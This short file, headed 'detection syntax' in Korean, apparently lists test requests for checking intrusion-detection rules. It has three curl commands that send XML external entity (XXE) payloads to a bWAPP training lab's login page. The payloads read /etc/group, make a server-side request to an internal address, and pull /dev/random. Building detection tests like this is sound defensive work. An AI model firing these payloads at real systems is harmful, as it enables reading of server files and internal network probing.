## 탐지 구문 ##
curl -k --resolve curl.ncurity.com:80:192.168.41.52 -X POST "http://curl.ncurity.com/bWAPP/login.php" -d "<?xml version="1.0" encoding="ISO-8859-1"?>&<!DOCTYPE foo [&<!ELEMENT foo ANY >&<!ENTITY xxe SYSTEM "file:///etc/group" >]>&<foo>&xxe;</foo>"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 -X POST "http://curl.ncurity.com/bWAPP/login.php" -d "<!DOCTYPE root [&<!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 -X POST "http://curl.ncurity.com/bWAPP/login.php" -d "<!DOCTYPE root [&<!ENTITY xxe SYSTEM "file:///dev/random" >]>"
